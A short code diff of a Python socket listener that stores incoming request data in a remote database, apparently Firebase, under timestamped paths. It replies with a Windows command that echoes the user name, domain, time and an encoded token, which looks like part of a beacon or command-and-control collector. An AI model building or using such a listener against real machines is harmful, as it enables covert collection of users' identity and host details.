@@ -59,10 +59,9 @@ def x(path):
     #return str(dt)
     #t = dt['t'].replace('+', ' ')
     data = dict()
-    data['time'] = datetime.datetime.now().strftime("%I:%M:%S:%f%p on %B %d, %Y")
     data['data'] = dt
     data['raw'] = path[2:]
-    fb.post('/',data)
+    fb.patch(datetime.datetime.now().strftime("/%Y/%m/%d/%H/%M/%S/%f/"),data)
     return "echo %TIME% %DATE% %USERNAME% %USERDOMAIN% %RANDOM% *VkcxR2ExcFhWblU9* test"
 
 listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
